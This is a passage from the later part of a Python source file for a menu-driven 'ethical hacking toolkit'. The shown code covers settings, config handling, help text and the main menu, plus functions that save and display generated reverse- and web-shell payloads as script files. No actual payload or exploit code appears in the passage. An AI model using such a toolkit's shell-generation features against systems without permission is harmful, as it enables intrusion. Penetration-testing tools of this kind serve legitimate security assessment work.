def save_payload(payload: Payload) -> str:
    """Save a payload to file with appropriate extension."""
    ext = "txt"

    if payload.target_platform in ["linux", "windows"]:
        ext = "sh" if payload.target_platform == "linux" else "ps1"
    elif payload.target_platform == "php":
        ext = "php"
    elif payload.target_platform == "aspx":
        ext = "aspx"

    filename = f"{payload.name}.{ext}"
    filepath = AppConfig.PAYLOADS_DIR / filename

    with open(filepath, "w") as f:
        f.write(payload.content)

    return str(filepath)


def display_payload(payload: Payload) -> None:
    """Display payload details and content."""
    console.print()

    # Determine the syntax highlighting language
    language = "bash"
    if payload.target_platform == "windows":
        language = "powershell"
    elif payload.target_platform == "php":
        language = "php"
    elif payload.target_platform == "aspx":
        language = "html"

    # Display payload info panel
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Type:[/] {payload.payload_type}\n"
            f"[bold {NordColors.FROST_2}]Platform:[/] {payload.target_platform}\n"
            f"[bold {NordColors.FROST_2}]Generated:[/] {payload.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title=f"Payload: {payload.name}",
        border_style=NordColors.EXPLOITATION,
    )
    console.print(panel)

    # Display the payload content with syntax highlighting
    from rich.syntax import Syntax

    console.print(Syntax(payload.content, language, theme="nord", line_numbers=True))

    # Show disclaimer
    console.print(
        f"[bold {NordColors.YELLOW}]DISCLAIMER:[/] This payload is for educational purposes only."
    )


def settings_module() -> None:
    """Settings module to configure application behavior."""
    console.clear()
    console.print(create_header())
    display_panel(
        "Configure application settings and options.",
        NordColors.UTILITIES,
        "Settings and Configuration",
    )

    config = load_config()
    display_config(config)

    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Change Number of Threads")
    table.add_row("2", "Change Timeout")
    table.add_row("3", "Change User Agent")
    table.add_row("4", "Reset to Default Settings")
    table.add_row("0", "Return to Main Menu")
    console.print(table)

    choice = get_integer_input("Select an option", 0, 4)

    if choice == 0:
        return
    elif choice == 1:
        threads = get_integer_input("Enter number of threads (1-50)", 1, 50)
        if threads > 0:
            config["threads"] = threads
            if save_config(config):
                print_success(f"Threads set to {threads}")
    elif choice == 2:
        timeout = get_integer_input("Enter timeout in seconds (1-120)", 1, 120)
        if timeout > 0:
            config["timeout"] = timeout
            if save_config(config):
                print_success(f"Timeout set to {timeout} seconds")
    elif choice == 3:
        console.print(
            f"[bold {NordColors.FROST_2}]Current User Agent:[/] {config.get('user_agent', 'Not set')}"
        )
        console.print("Available User Agents:")
        for i, agent in enumerate(AppConfig.USER_AGENTS, 1):
            console.print(f"{i}. {agent}")
        console.print(f"{len(AppConfig.USER_AGENTS) + 1}. Custom User Agent")

        agent_choice = get_integer_input(
            "Select a user agent", 1, len(AppConfig.USER_AGENTS) + 1
        )

        if agent_choice > 0:
            if agent_choice <= len(AppConfig.USER_AGENTS):
                config["user_agent"] = AppConfig.USER_AGENTS[agent_choice - 1]
            else:
                custom = get_user_input("Enter custom user agent")
                if custom:
                    config["user_agent"] = custom

            if save_config(config):
                print_success("User agent updated")
    elif choice == 4:
        if get_confirmation("Reset settings to default?"):
            default_config = {
                "threads": AppConfig.DEFAULT_THREADS,
                "timeout": AppConfig.DEFAULT_TIMEOUT,
                "user_agent": random.choice(AppConfig.USER_AGENTS),
            }

            if save_config(default_config):
                print_success("Settings reset to default")

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def load_config() -> Dict[str, Any]:
    """Load configuration from the config file."""
    config_file = AppConfig.CONFIG_DIR / "config.json"

    # Default configuration
    default = {
        "threads": AppConfig.DEFAULT_THREADS,
        "timeout": AppConfig.DEFAULT_TIMEOUT,
        "user_agent": random.choice(AppConfig.USER_AGENTS),
    }

    # Create default config if file doesn't exist
    if not config_file.exists():
        with open(config_file, "w") as f:
            json.dump(default, f, indent=2)
        return default

    # Load existing config
    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except Exception as e:
        print_error(f"Error loading config: {e}")
        return default


def save_config(config: Dict[str, Any]) -> bool:
    """Save configuration to the config file."""
    config_file = AppConfig.CONFIG_DIR / "config.json"

    try:
        with open(config_file, "w") as f:
            json.dump(config, f, indent=2)
        return True
    except Exception as e:
        print_error(f"Error saving config: {e}")
        return False


def display_config(config: Dict[str, Any]) -> None:
    """Display current configuration settings."""
    table = Table(
        title="Current Configuration",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Setting", style=f"bold {NordColors.FROST_2}")
    table.add_column("Value", style=NordColors.SNOW_STORM_1)

    for key, value in config.items():
        formatted = ", ".join(value) if isinstance(value, list) else str(value)
        table.add_row(key.replace("_", " ").title(), formatted)

    console.print(table)


def display_help() -> None:
    """Display help and documentation."""
    console.clear()
    console.print(create_header())
    display_panel("Help and Documentation", NordColors.UTILITIES, "Help Center")

    help_text = """
## Overview
Python Ethical Hacking Toolkit is a CLI tool for security testing and ethical hacking.
It provides modules for network scanning, OSINT collection, enumeration, and payload generation.

## Modules
1. **Network Scanning**: Discover active hosts and open ports
2. **OSINT Gathering**: Collect publicly available target information
3. **Username Enumeration**: Check for usernames across platforms
4. **Service Enumeration**: Gather service details
5. **Payload Generation**: Create basic reverse and web shells
6. **Settings**: Configure application settings

## Usage Tips
- Use Network Scanning to identify active hosts on a network before further enumeration
- OSINT module provides basic domain intelligence without requiring API keys
- Username Enumeration helps in reconnaissance during social engineering assessments
- Service Enumeration identifies potential attack vectors
- Payload Generation creates basic testing payloads for authorized security assessments

## Disclaimer
This tool is designed for ethical security testing only. 
Use only on systems you have permission to test.
Unauthorized testing of systems is illegal and unethical.
"""

    console.print(Markdown(help_text))
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


# ----------------------------------------------------------------
# Signal Handling and Cleanup
# ----------------------------------------------------------------
def cleanup() -> None:
    """Clean up resources before exiting."""
    print_message("Cleaning up resources...", NordColors.FROST_3)


def signal_handler(sig: int, frame: Any) -> None:
    """Handle interrupt signals."""
    try:
        sig_name = signal.Signals(sig).name
        print_warning(f"Process interrupted by {sig_name}")
    except Exception:
        print_warning(f"Process interrupted by signal {sig}")
    cleanup()
    sys.exit(128 + sig)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)


# ----------------------------------------------------------------
# Main Menu and Entry Point
# ----------------------------------------------------------------
def display_main_menu() -> None:
    """Display the main menu."""
    console.clear()
    console.print(create_header())

    # Display current time and hostname
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    console.print(
        Align.center(
            f"[{NordColors.SNOW_STORM_1}]Time: {current_time}[/] | [{NordColors.SNOW_STORM_1}]Host: {AppConfig.HOSTNAME}[/]"
        )
    )
    console.print()

    # Display menu options
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}", width=6)
    table.add_column("Module", style=NordColors.SNOW_STORM_1, width=30)
    table.add_column("Description", style=NordColors.SNOW_STORM_2)

    table.add_row(
        "1",
        f"[bold {NordColors.RECONNAISSANCE}]Network Scanning[/]",
        "Discover hosts, open ports and services",
    )
    table.add_row(
        "2",
        f"[bold {NordColors.RECONNAISSANCE}]OSINT Gathering[/]",
        "Collect public intelligence about targets",
    )
    table.add_row(
        "3",
        f"[bold {NordColors.ENUMERATION}]Username Enumeration[/]",
        "Check for username availability across platforms",
    )
    table.add_row(
        "4",
        f"[bold {NordColors.ENUMERATION}]Service Enumeration[/]",
        "Gather detailed service information",
    )
    table.add_row(
        "5",
        f"[bold {NordColors.EXPLOITATION}]Payload Generation[/]",
        "Create basic shells and payloads",
    )
    table.add_row(
        "6",
        f"[bold {NordColors.UTILITIES}]Settings[/]",
        "Configure application settings",
    )
    table.add_row(
        "7", f"[bold {NordColors.UTILITIES}]Help[/]", "Display help and documentation"
    )
    table.add_row("0", "Exit", "Exit the application")

    console.print(table)


def main() -> None:
    """Main application entry point."""
    try:
        print_message(
            f"Starting {AppConfig.APP_NAME} v{AppConfig.VERSION}", NordColors.GREEN
        )

        while True:
            display_main_menu()
            choice = get_integer_input("Enter your choice", 0, 7)

            if choice == 0:
                console.clear()
                console.print(
                    Panel(
                        Text(
                            "Thank you for using Python Ethical Hacking Toolkit!",
                            style=f"bold {NordColors.FROST_2}",
                        ),
                        border_style=NordColors.FROST_1,
                        padding=(1, 2),
                    )
                )
                print_message("Exiting application", NordColors.FROST_3)
                break
            elif choice == 1:
                network_scanning_module()
            elif choice == 2:
                osint_gathering_module()
            elif choice == 3:
                username_enumeration_module()
            elif choice == 4:
                service_enumeration_module()
            elif choice == 5:
                payload_generation_module()
            elif choice == 6:
                settings_module()
            elif choice == 7:
                display_help()

    except KeyboardInterrupt:
        print_warning("Operation cancelled by user")
        display_panel("Operation cancelled", NordColors.YELLOW, "Cancelled")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unhandled error: {e}")
        display_panel(f"Unhandled error: {e}", NordColors.RED, "Error")
        console.print_exception()
        sys.exit(1)


if __name__ == "__main__":
    main()
